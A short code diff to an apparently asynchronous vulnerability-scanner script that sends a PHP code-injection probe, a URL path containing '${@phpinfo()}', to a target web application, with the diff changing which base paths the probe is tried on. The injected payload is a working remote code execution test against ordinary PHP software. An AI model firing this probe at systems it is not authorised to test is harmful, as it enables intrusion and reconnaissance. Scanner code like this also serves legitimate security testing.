@@ -21,12 +21,8 @@ class POC(Script):
         await self.get_url()
         if self.base_url:
             pocs = ["index.php/module/aciton/param1/${@phpinfo()}"]
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/'),
-                self.url_normpath(self.url, './'),
-            ]))
             async with ClientSession() as session:
-                for path in path_list:
+                for path in self.url_normpath(self.url, ['./public/', './']):
                     for poc in pocs:
                         url = path + poc
                         async with session.get(url=url) as res:
